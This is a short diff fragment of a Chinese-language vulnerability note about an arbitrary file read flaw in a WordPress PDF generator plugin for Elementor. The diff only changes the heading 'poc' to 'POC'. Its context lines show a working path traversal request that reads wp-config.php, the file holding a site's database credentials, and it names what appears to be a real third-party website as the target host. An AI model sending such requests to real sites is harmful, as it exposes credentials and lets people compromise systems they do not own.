@@ -7,7 +7,7 @@ WordPress插件rtw_pdf_file任意文件读取漏洞，适用于 WordPress 的 El
 "wp-content/plugins/pdf-generator-addon-for-elementor-page-builder"
 ```
 
-## poc
+## POC
 ```javascript
 GET /?rtw_pdf_file=../../../wp-config.php&rtw_generate_pdf=1 HTTP/1.1
 Host: korurealestate.co.uk
